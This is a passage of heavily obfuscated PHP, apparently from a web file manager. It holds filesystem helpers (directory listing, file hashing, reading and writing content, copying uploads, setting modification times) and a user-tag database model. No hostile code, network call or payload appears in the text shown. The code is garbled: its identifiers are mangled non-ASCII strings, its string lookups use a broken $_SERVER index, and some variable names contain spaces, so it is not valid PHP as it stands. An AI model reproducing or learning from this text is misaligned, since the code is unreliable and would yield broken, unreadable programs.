$D«ùŒ—©÷‡ == $fãªÊÄæˆİ[1152]) { continue; } $fã–ÏÏØ²“ = $cçÅ¡‘¨× . $D«ùŒ—©÷‡; if (is_dir($fã–ÏÏØ²“) && !is_link($fã–ÏÏØ²“)) { $ağ—Ş¾´Éã[] = array($fãªÊÄæˆİ[75] => $fã–ÏÏØ²“ . $fãªÊÄæˆİ[8], $fãªÊÄæˆİ[76] => 1, $fãªÊÄæˆİ[107] => @filemtime($fã–ÏÏØ²“), $fãªÊÄæˆİ[77] => 0); $this->listAll($fã–ÏÏØ²“, $ağ—Ş¾´Éã); } else { $ağ—Ş¾´Éã[] = array($fãªÊÄæˆİ[75] => $fã–ÏÏØ²“, $fãªÊÄæˆİ[76] => 0, $fãªÊÄæˆİ[107] => @filemtime($fã–ÏÏØ²“), $fãªÊÄæˆİ[77] => $this->size($fã–ÏÏØ²“)); } } closedir($C¶Ù°óùù’); goto DÚ›‹×‹ªİ; FÆ¹ÓÜ„Ü£: } public function has($fÑİÆŒêÎ‚, $BƒÂÕÙˆåß = false, $DâÃßôÄœ™ = true) { goto b¹ˆß½Ó; F” Ê…ÒÅ: if ($BƒÂÕÙˆåß) { return array($cÀƒŒ½–ˆé[191] => $cÉèÅÏ³³¤, $cÀƒŒ½–ˆé[192] => $cø»æ’˜íî); } return !1; goto DŒ¾á³õ·º; b¹ˆß½Ó: $cÀƒŒ½–ˆé =& $_SERVER[“]; $fÑİÆŒêÎ‚ = $this->iconvSystem($fÑİÆŒêÎ‚); $fÑİÆŒêÎ‚ = rtrim($fÑİÆŒêÎ‚, $cÀƒŒ½–ˆé[8]) . $cÀƒŒ½–ˆé[8]; goto föË†ó·ò¹; föË†ó·ò¹: if (!($dìÀóİåòé = @opendir($fÑİÆŒêÎ‚))) { return !1; } $cÉèÅÏ³³¤ = 0; $cø»æ’˜íî = 0; goto dŒ½½¬â¹ñ; dŒ½½¬â¹ñ: $fÌ¶¾ÍÛöÜ = 0; while (($b™Ş—æèñ = readdir($dìÀóİåòé)) !== !1) { if ($b™Ş—æèñ == $cÀƒŒ½–ˆé[91] || $b™Ş—æèñ == $cÀƒŒ½–ˆé[1152]) { continue; } $FÈšºÇ¾ğ‚ = $fÑİÆŒêÎ‚ . $b™Ş—æèñ; if ($BƒÂÕÙˆåß) { $fÌ¶¾ÍÛöÜ++; if (@is_file($FÈšºÇ¾ğ‚)) { $cÉèÅÏ³³¤++; } else { $cø»æ’˜íî++; } if ($fÌ¶¾ÍÛöÜ > 10000) { break; } continue; } if ($DâÃßôÄœ™) { if (@is_file($FÈšºÇ¾ğ‚)) { return !0; } } else { if (@is_dir($FÈšºÇ¾ğ‚ . $cÀƒŒ½–ˆé[8])) { return !0; } } } closedir($dìÀóİåòé); goto F” Ê…ÒÅ; DŒ¾á³õ·º: } public function hashSimple($eŸ£ÅÔ«) { goto FÕøÅÒ¸ê; c¤À™§â˜: $BÑÊ¶ğÖ¶¶ = fopen($eŸ£ÅÔ«, $FŞÓååğø¶[1157]); if (!$BÑÊ¶ğÖ¶¶) { return $c‹ŒÄÛ„; } for ($D¨ææ‡Ãïè = 0; $D¨ææ‡Ãïè < $fÚéÛñ‚å†; $D¨ææ‡Ãïè++) { fseek($BÑÊ¶ğÖ¶¶, $eÔÑ ßÑ¥â * $D¨ææ‡Ãïè); $c‹ŒÄÛ„ .= fread($BÑÊ¶ğÖ¶¶, $B½ÁÇÌÔ±À); } goto c†ÂÄÜ®Ü; FÕøÅÒ¸ê: $FŞÓååğø¶ =& $_SERVER[“]; if (!$eŸ£ÅÔ«) { return md5($FŞÓååğø¶[33]); } $eŸ£ÅÔ« = $this->iconvSystem($eŸ£ÅÔ«); goto D†‡¯İÃ‘; c†ÂÄÜ®Ü: fseek($BÑÊ¶ğÖ¶¶, $eöÁèâëĞ - $B½ÁÇÌÔ±À); $c‹ŒÄÛ„ .= fread($BÑÊ¶ğÖ¶¶, $B½ÁÇÌÔ±À); fclose($BÑÊ¶ğÖ¶¶); goto f‹£ƒÅÁ¼; f‹£ƒÅÁ¼: return md5($c‹ŒÄÛ„) . $eöÁèâëĞ; goto C´“Âò­À‰; bĞÜÆœ«ò—: if ($eöÁèâëĞ <= $B½ÁÇÌÔ±À * $fÚéÛñ‚å†) { return $this->hashMd5($eŸ£ÅÔ«) . $eöÁèâëĞ; } $c‹ŒÄÛ„ = $FŞÓååğø¶[33]; $eÔÑ ßÑ¥â = intval($eöÁèâëĞ / $fÚéÛñ‚å†); goto c¤À™§â˜; D†‡¯İÃ‘: $eöÁèâëĞ = $this->size($eŸ£ÅÔ«); $B½ÁÇÌÔ±À = 200; $fÚéÛñ‚å† = 50; goto bĞÜÆœ«ò—; C´“Âò­À‰: } public function getContent($Bí¢÷ù‚‘) { $Bí¢÷ù‚‘ = $this->iconvSystem($Bí¢÷ù‚‘); return file_get_contents($Bí¢÷ù‚‘); } public function setContent($díÇ—àãšÛ, $BËŸ‘×Ğï = '') { $díÇ—àãšÛ = $this->iconvSystem($díÇ—àãšÛ); @file_put_contents($díÇ—àãšÛ, $BËŸ‘×Ğï, LOCK_EX); clearstatcache(); return strlen($BËŸ‘×Ğï) == filesize($díÇ—àãšÛ); } public function fileSubstr($Fã‚°¸Á‚ä, $Fé½ÑÛÜ”˜ = 0, $a‘ãì‡Î¯é = false) { goto DâîÓ„Ÿè; a²‰ƒ¾‰ßÑ: return $Dï™‹”±ŸË; goto C¡¯Ê‰ñÇ; DâîÓ„Ÿè: $EˆŒ‰«–ø =& $_SERVER[“]; $Fã‚°¸Á‚ä = $this->iconvSystem($Fã‚°¸Á‚ä); if ($a‘ãì‡Î¯é === !1) { $a‘ãì‡Î¯é = $this->size($Fã‚°¸Á‚ä); } goto FÈ‚È×Á§ğ; F—†Ğ¬½ÁÙ: fseek($eñ½¨ˆÑÍ«, $Fé½ÑÛÜ”˜); $Dï™‹”±ŸË = fread($eñ½¨ˆÑÍ«, $a‘ãì‡Î¯é); fclose($eñ½¨ˆÑÍ«); goto a²‰ƒ¾‰ßÑ; FÈ‚È×Á§ğ: if ($a‘ãì‡Î¯é <= 0) { return $EˆŒ‰«–ø[33]; } $eñ½¨ˆÑÍ« = fopen($Fã‚°¸Á‚ä, $EˆŒ‰«–ø[1157]); if (!$eñ½¨ˆÑÍ«) { return !1; } goto F—†Ğ¬½ÁÙ; C¡¯Ê‰ñÇ: } public function upload($DÀ‡ÔÃ¦œ¥, $bá‹…Şœ‚á, $a’¬±è´ƒŒ = false, $F¨£’Ã§‡‡ = REPEAT_REPLACE) { $a§ÒùÀŒô = $this->copyFile($bá‹…Şœ‚á, $DÀ‡ÔÃ¦œ¥); return $a§ÒùÀŒô ? $this->getPathOuter($DÀ‡ÔÃ¦œ¥) : !1; } public function setModifyTime($EÅˆëÜê”˜, $D¥Ûñ•š˜Ä = '') { @touch($EÅˆëÜê”˜, intval($D¥Ûñ•š˜Ä)); } public function download($F¹î±—Ø¸­, $fÆ¬…¢÷ª÷) { return $this->iconvSystem($F¹î±—Ø¸­); } } goto E¬¼×¿Š; AÈËùŸ®µƒ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($CçÖã—Ÿ‘‰) { $bÄ¤¢‰íÄŒ =& $_SERVER[“]; return array($bÄ¤¢‰íÄŒ[2191] => array(USER_ID, $bÄ¤¢‰íÄŒ[2192])); } protected function listData() { $CäöÕ¿ˆÇ =& $_SERVER[“]; $fÏ¤½Ó’¼ = array($CäöÕ¿ˆÇ[1413] => USER_ID, $CäöÕ¿ˆÇ[436] => array($CäöÕ¿ˆÇ[2195], 0)); $c˜ğ°¿ËÅ´ = $CäöÕ¿ˆÇ[2197]; $e³ó–˜ÁÔ = $this->field($c˜ğ°¿ËÅ´)->where($fÏ¤½Ó’¼)->order($CäöÕ¿ˆÇ[2198])->select(); return $e³ó–˜ÁÔ ? $e³ó–˜ÁÔ : array(); } protected function listByTag($A¶šÏ•ƒƒó) { } protected function addToTag($BÒ‡çšæƒ•, $C¸˜ğš®‘Æ) { $a¿†—ôÌÇ =& $_SERVER[“]; if (!Model($a¿†—ôÌÇ[2322])->listData($C¸˜ğš®‘Æ) || !Model($a¿†—ôÌÇ[736])->pathInfo($BÒ‡çšæƒ•)) { return !1; } $C½Ş“Ë«®¢ = array($a¿†—ôÌÇ[1413] => USER_ID, $a¿†—ôÌÇ[436] => $C¸˜ğš®‘Æ, $a¿†—ôÌÇ[387] => $BÒ‡çšæƒ•, $a¿†—ôÌÇ[388] => $a¿†—ôÌÇ[382], $a¿†—ôÌÇ[386] => $a¿†—ôÌÇ[33], $a¿†—ôÌÇ[2099] => 0); if ($this->where($C½Ş“Ë«®¢)->find()) { return !1; } return $this->add($C½Ş“Ë«®¢); } protected function removeFromTag($A³ÃŞÊ£ÃÆ, $d”æ©¶¹¦œ) { $A³¿ƒİåÏÌ =& $_SERVER[“]; if (!Model($A³¿ƒİåÏÌ[2322])->listData($d”æ©¶¹¦œ)) { return !1; } if (is_array($A³ÃŞÊ£ÃÆ)) { $A³ÃŞÊ£ÃÆ = array($A³¿ƒİåÏÌ[7], $A³ÃŞÊ£ÃÆ); } $BÃç²îóªé = array($A³¿ƒİåÏÌ[1413] => USER_ID, $A³¿ƒİåÏÌ[436] => $d”æ©¶¹¦œ, $A³¿ƒİåÏÌ[388] => $A³¿ƒİåÏÌ[382], $A³¿ƒİåÏÌ[387] => $A³ÃŞÊ£ÃÆ); return $this->where($BÃç²îóªé)->delete(); } protected function removeByTag($eØ†£Œ¯ƒ†) { $aÑ‰ŠÖƒ¾ =& $_SERVER[“]; if (!$eØ†£Œ¯ƒ†) { return !1; } $bÎÕ÷®“Ü¶ = array($aÑ‰ŠÖƒ¾[1413] => USER_ID, $aÑ‰ŠÖƒ¾[436] => $eØ†£Œ¯ƒ†); return $this->where($bÎÕ÷®“Ü¶)->delete(); } protected function removeBySource($BÌ¾ĞŸÒáÉ) { $aâ®í¤Œ”Ï =& $_SERVER[“]; if (is_array($BÌ¾ĞŸÒáÉ)) { $BÌ¾ĞŸÒáÉ = array($aâ®í¤Œ”Ï[7], $BÌ¾ĞŸÒáÉ); } $b×ãÑÄí — = array($aâ®í¤Œ”Ï[1413] => USER_ID, $aâ®í¤Œ”Ï[387] => $BÌ¾ĞŸÒáÉ, $aâ®í¤Œ”Ï[436] => array($aâ®í¤Œ”Ï[914], 0)); return $this->where($b×ãÑÄí —)->delete(); } }